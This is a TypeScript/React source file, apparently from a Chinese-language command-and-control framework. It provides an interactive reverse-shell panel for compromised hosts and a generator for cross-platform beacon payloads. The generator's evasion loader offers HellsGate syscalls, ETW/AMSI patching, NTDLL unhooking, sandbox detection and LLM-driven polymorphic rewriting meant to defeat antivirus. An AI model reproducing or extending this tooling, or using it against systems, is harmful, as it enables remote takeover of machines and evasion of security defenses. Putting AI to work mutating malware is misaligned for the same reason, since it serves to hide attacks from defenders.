"use client";

// c2-shell-panel.tsx — C2 反弹 Shell 面板：SSE 推输出 + POST 发命令（交互式）
// c2-agent-builder.tsx — Agent 生成器面板：参数 → API → 下载
import React from "react";
import { api } from "@/lib/api";
import { TerminalIcon, XIcon, PackageIcon, DownloadIcon, CogIcon, ShieldIcon } from "lucide-react";

// ---------- 反弹 Shell ----------
export function C2ShellPanel({ beaconId }: { beaconId: string }) {
  const [output, setOutput] = React.useState("");
  const [cmd, setCmd] = React.useState("");
  const [shellId, setShellId] = React.useState("");
  const [connected, setConnected] = React.useState(false);
  const esRef = React.useRef<EventSource | null>(null);
  const outRef = React.useRef<HTMLPreElement>(null);
  const histRef = React.useRef<string[]>([]);
  const hidxRef = React.useRef(-1);

  const append = (s: string) => setOutput((o) => o + s + "\n");
  React.useEffect(() => { if (outRef.current) outRef.current.scrollTop = outRef.current.scrollHeight; }, [output]);

  const connect = () => {
    if (esRef.current) esRef.current.close();
    // 1958：token 不再拼 URL（同源请求自动携带 forang_token cookie 鉴权）。
    const es = new EventSource(`/api/tools/c2/shell/ws?session_id=${beaconId}`);
    esRef.current = es;

    es.addEventListener("shell_open", (e) => {
      const d = JSON.parse((e as MessageEvent).data);
      setShellId(d.shell_id);
      setConnected(true);
      setOutput(`[*] Shell 已建立 (${d.shell_id})\n`);
    });
    es.addEventListener("output", (e) => {
      const d = JSON.parse((e as MessageEvent).data);
      append(d.text || "");
    });
    es.onerror = () => {
      setConnected(false);
      append("[!] Shell 连接断开");
    };
  };

  const disconnect = () => {
    if (esRef.current) esRef.current.close();
    esRef.current = null;
    setConnected(false);
    if (shellId) {
      fetch(`/api/tools/c2/shell/${shellId}`, {
        method: "DELETE",
        headers: { Authorization: `Bearer ${localStorage.getItem("forang_token") || ""}` },
      });
    }
  };

  React.useEffect(() => () => disconnect(), []);
  React.useEffect(() => { disconnect(); connect(); }, [beaconId]); // eslint-disable-line

  const send = async () => {
    if (!cmd.trim() || !shellId) return;
    append(`shell> ${cmd}`);
    histRef.current.push(cmd);
    hidxRef.current = -1;
    setCmd("");
    try {
      await fetch("/api/tools/c2/shell/cmd", {
        method: "POST",
        headers: { "Content-Type": "application/json", Authorization: `Bearer ${localStorage.getItem("forang_token") || ""}` },
        body: JSON.stringify({ shell_id: shellId, cmd }),
      });
    } catch (e) {
      append("[!] 发送失败: " + (e instanceof Error ? e.message : String(e)));
    }
  };

  return (
    <div className="flex h-full flex-col text-[11px]">
      <div className="flex items-center gap-1 border-b border-zinc-800 px-2 py-1">
        <TerminalIcon className="size-3.5 text-red-400" />
        <span className="font-semibold text-zinc-300">反弹 Shell</span>
        <span className={`rounded px-1.5 text-[9px] ${connected ? "bg-green-500/20 text-green-400" : "bg-red-500/20 text-red-400"}`}>
          {connected ? "已连接" : "未连接"}
        </span>
        {!connected ? (
          <button className="ml-auto rounded border border-blue-500 bg-blue-500/10 px-1.5 py-0.5 text-blue-300 hover:bg-blue-500/20" onClick={connect}>连接</button>
        ) : (
          <button className="ml-auto rounded border border-red-800 bg-red-950/50 px-1.5 py-0.5 text-red-300 hover:bg-red-900/50" onClick={disconnect}><XIcon className="size-3" /></button>
        )}
      </div>
      <pre ref={outRef} className="min-h-0 flex-1 overflow-auto whitespace-pre-wrap bg-black px-2 py-1 font-mono text-green-400">
        {output || "（点击「连接」建立交互式 Shell）"}
      </pre>
      <div className="flex items-center gap-1 border-t border-zinc-800 px-2 py-1">
        <span className="shrink-0 font-mono text-red-400">shell&gt;</span>
        <input
          className="flex-1 bg-transparent font-mono text-zinc-200 outline-none placeholder:text-zinc-600"
          placeholder={connected ? "输入命令（Enter 发送，↑↓ 历史）" : "先连接…"}
          value={cmd}
          disabled={!connected}
          onChange={(e) => setCmd(e.target.value)}
          onKeyDown={(e) => {
            if (e.key === "Enter") send();
            if (e.key === "ArrowUp") {
              e.preventDefault();
              const h = histRef.current;
              if (!h.length) return;
              hidxRef.current = hidxRef.current < 0 ? h.length - 1 : Math.max(0, hidxRef.current - 1);
              setCmd(h[hidxRef.current]);
            }
            if (e.key === "ArrowDown") {
              e.preventDefault();
              const h = histRef.current;
              if (hidxRef.current >= 0 && hidxRef.current < h.length - 1) { hidxRef.current++; setCmd(h[hidxRef.current]); }
              else { hidxRef.current = -1; setCmd(""); }
            }
          }}
        />
      </div>
    </div>
  );
}

// ---------- Agent 生成器 ----------
// CS/vshell 风格一键载荷：选监听器 + 平台格式 → 真实 beacon 二进制（连接参数
// 编译时内嵌），下载即部署。旧版只本地拼配置 JSON 让用户自己找工具链编译。
type ListenerLite = { id: string; name: string; host: string; port: number; protocol: string };

const AGENT_FORMATS: { value: string; label: string }[] = [
  { value: "amd64_exe", label: "Windows x64 EXE" },
  { value: "x86_exe", label: "Windows x86 EXE" },
  { value: "amd64_dll", label: "Windows x64 DLL" },
  { value: "amd64_exe_g", label: "Windows x64 EXE（调试版）" },
  { value: "linux_elf", label: "Linux x64 ELF" },
  { value: "linux_elf_g", label: "Linux x64 ELF（调试版）" },
  { value: "linux_arm64", label: "Linux ARM64 ELF" },
  { value: "darwin_amd64", label: "macOS Intel（x64）" },
  { value: "darwin_arm64", label: "macOS Apple Silicon（ARM64）" },
  { value: "shellcode", label: "Shellcode（donut）" },
];

export function C2AgentBuilder() {
  const [listeners, setListeners] = React.useState<ListenerLite[]>([]);
  const [listenerId, setListenerId] = React.useState("");
  const [format, setFormat] = React.useState("amd64_exe");
  const [technique, setTechnique] = React.useState("t1_classic");
  const [aiPoly, setAiPoly] = React.useState(false);
  const [interval_, setInterval_] = React.useState(5);
  const [jitter, setJitter] = React.useState(20);
  const [result, setResult] = React.useState<{ url: string; filename: string; size: number; sha256: string; server: string } | null>(null);
  const [busy, setBusy] = React.useState(false);
  const [err, setErr] = React.useState("");

  const loadListeners = React.useCallback(async () => {
    try {
      const r = await api.c2Listeners();
      const list = ((r as unknown as { data: ListenerLite[] }).data ?? []).map((l: ListenerLite) => ({
        id: l.id, name: l.name, host: l.host, port: l.port, protocol: l.protocol ?? "",
      }));
      setListeners(list);
      if (list.length > 0 && !listenerId) setListenerId(list[0].id);
    } catch (e) {
      setErr("监听器加载失败: " + (e instanceof Error ? e.message : String(e)));
    }
  }, [listenerId]);

  React.useEffect(() => { void loadListeners(); }, [loadListeners]);

  const build = async () => {
    if (!listenerId) { setErr("请先选择监听器"); return; }
    setBusy(true); setErr(""); setResult(null);
    try {
      const { blob, filename, server } = await api.c2Generate({ listener_id: listenerId, format });
      const buf = await blob.arrayBuffer();
      // WebCrypto 仅安全上下文（HTTPS/localhost）可用——HTTP 部署下降级跳过哈希
      let sha256 = "";
      if (typeof crypto !== "undefined" && crypto.subtle) {
        const digest = await crypto.subtle.digest("SHA-256", buf);
        sha256 = Array.from(new Uint8Array(digest)).map((b) => b.toString(16).padStart(2, "0")).join("");
      }
      const url = URL.createObjectURL(blob);
      setResult({ url, filename, size: blob.size, sha256, server });
    } catch (e) {
      setErr(e instanceof Error ? e.message : String(e));
    } finally { setBusy(false); }
  };

  const loaderBuild = async () => {
    if (!listenerId) { setErr("请先选择监听器"); return; }
    setBusy(true); setErr(""); setResult(null);
    try {
      const { blob, filename } = await api.c2LoaderGenerate({ listener_id: listenerId, technique, ai_poly: aiPoly && technique !== "t0_drop" });
      const url = URL.createObjectURL(blob);
      setResult({ url, filename, size: blob.size, sha256: "", server: "" });
    } catch (e) {
      setErr(e instanceof Error ? e.message : String(e));
    } finally { setBusy(false); }
  };

  const sel = listeners.find((l) => l.id === listenerId);

  return (
    <div className="mx-auto max-w-2xl space-y-3 text-sm">
      <div className="flex items-center gap-2">
        <PackageIcon className="size-5 text-blue-500" />
        <span className="text-base font-semibold">Agent 生成器</span>
        <span className="rounded bg-muted px-1.5 py-0.5 text-[10px] text-muted-foreground">连接参数编译内嵌 · 下载即部署</span>
      </div>

      {err && <div className="rounded border border-red-500/40 bg-red-500/10 p-2 text-xs text-red-600">{err}</div>}

      <div className="grid grid-cols-2 gap-3">
        <div className="col-span-2">
          <label className="mb-1 block text-xs text-muted-foreground">监听器（回连目标）</label>
          <select className="w-full rounded border bg-zinc-900 p-2 text-sm text-zinc-100 [color-scheme:dark]" value={listenerId} onChange={(e) => setListenerId(e.target.value)}>
            {listeners.length === 0 && <option value="">（无可用监听器）</option>}
            {listeners.map((l) => (
              <option key={l.id} value={l.id}>{l.name} · {l.host}:{l.port} ({l.protocol})</option>
            ))}
          </select>
        </div>
        <div className="col-span-2">
          <label className="mb-1 block text-xs text-muted-foreground">载荷格式</label>
          <select className="w-full rounded border bg-zinc-900 p-2 text-sm text-zinc-100 [color-scheme:dark]" value={format} onChange={(e) => setFormat(e.target.value)}>
            {AGENT_FORMATS.map((f) => (<option key={f.value} value={f.value}>{f.label}</option>))}
          </select>
        </div>
        <div>
          <label className="mb-1 block text-xs text-muted-foreground">回连间隔（秒，部署后 sleep 指令可调）</label>
          <input type="number" className="w-full rounded border bg-transparent p-2 text-sm" value={interval_}
                 onChange={(e) => setInterval_(Number(e.target.value) || 5)} />
        </div>
        <div>
          <label className="mb-1 block text-xs text-muted-foreground">抖动（%）</label>
          <input type="number" className="w-full rounded border bg-transparent p-2 text-sm" value={jitter}
                 onChange={(e) => setJitter(Number(e.target.value) || 20)} />
        </div>
      </div>

      <button
        className="flex items-center gap-2 rounded bg-blue-600 px-4 py-2 text-white hover:bg-blue-500 disabled:opacity-40"
        onClick={build}
        disabled={busy || listeners.length === 0}
      >
        <CogIcon className="size-4" /> {busy ? "生成中…" : "生成 Agent 载荷"}
      </button>

      <div className="rounded border border-amber-500/40 bg-amber-500/5 p-3 space-y-2">
        <div className="flex items-center gap-2 text-xs font-semibold text-amber-400">
          <ShieldIcon className="size-4" /> 免杀加载器（shellcode → 随机密钥模板 → 重编译）
        </div>
        <select className="w-full rounded border bg-zinc-900 p-2 text-sm text-zinc-100 [color-scheme:dark]" value={technique} onChange={(e) => setTechnique(e.target.value)}>
          <option value="t0_drop">T0 稳定：内嵌加密 beacon → 随机名落盘执行（回连最可靠）</option>
          <option value="t1_classic">T1 经典：HellsGate + DoubleXOR + IPv4 + ETW/AMSI 补丁 + NTDLL 脱钩</option>
          <option value="t3_sleep">T3 强免杀：+ VEH 保护 + 睡眠混淆 + 深度沙箱检测 + 行为延迟</option>
        </select>
        <label className="flex items-center gap-2 text-xs text-muted-foreground">
          <input type="checkbox" checked={aiPoly && technique !== "t0_drop"} disabled={technique === "t0_drop"} onChange={(e) => setAiPoly(e.target.checked)} />
          {technique === "t0_drop" ? "AI 多态变形仅 shellcode 型（T1/T3）支持——T0 为整 EXE 内嵌，密钥仍每次随机" : "AI 源码级多态变形（LLM 语义保持改写 + 编译验证，每次源码结构全新；+30~90 秒）"}
        </label>
        <button
          className="flex items-center gap-2 rounded bg-amber-500 px-4 py-2 font-medium text-zinc-950 hover:bg-amber-400 disabled:opacity-40"
          onClick={loaderBuild}
          disabled={busy || listeners.length === 0}
        >
          <CogIcon className="size-4" /> {busy ? (aiPoly ? "AI 变形 + 编译中（约 1-3 分钟）…" : "编译中（约 1-3 分钟）…") : "生成免杀 EXE"}
        </button>
      </div>

      {result && (
        <div className="space-y-1 rounded border border-green-500/40 bg-green-500/10 p-3">
          <div className="flex items-center justify-between">
            <span className="text-sm font-medium text-green-600">✓ {result.filename} 生成完成（{result.size} 字节）</span>
            <a href={result.url} download={result.filename}
               className="flex items-center gap-1 rounded border border-green-600 px-3 py-1 text-xs text-green-600 hover:bg-green-500/20">
              <DownloadIcon className="size-3" /> 下载
            </a>
          </div>
          {result.sha256 && (
            <div className="break-all font-mono text-[10px] text-muted-foreground">sha256: {result.sha256}</div>
          )}
          {result.server && (
            <div className="text-[10px] text-muted-foreground">
              内嵌回连地址：{result.server} · 在授权目标上执行即回连 {sel ? `监听器 ${sel.name}` : "所选监听器"}；回连间隔/抖动部署后可用 sleep 任务调整
            </div>
          )}
        </div>
      )}
    </div>
  );
}
